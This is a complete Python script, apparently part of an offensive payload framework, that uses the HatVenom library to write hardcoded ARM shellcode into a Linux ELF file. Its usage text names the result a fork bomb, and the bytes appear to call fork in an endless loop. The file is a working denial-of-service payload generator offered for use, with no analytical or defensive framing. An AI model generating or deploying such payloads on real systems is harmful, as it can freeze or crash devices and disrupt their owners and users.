#!/usr/bin/env python3

import sys

try:
    from hatvenom import HatVenom
except Exception:
    print("[-] Install HatVenom to continue!")
    sys.exit(1)

if len(sys.argv) < 2:
    print("Usage: linux_armle_fork_bomb.py <output_file>")
    sys.exit(1)

print("[*] Generating payload...")
shellcode = b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x7f\x40\x02\x27\x01\xdf\xc0\x46\xff\xf7\xfa\xff"

hatvenom = HatVenom()

print(f"[*] Writing payload to {sys.argv[1]}...")
hatvenom.generate_to('elf', 'armle', shellcode, filename=sys.argv[1])

print(f"[+] Wrote payload to {sys.argv[1]}!")
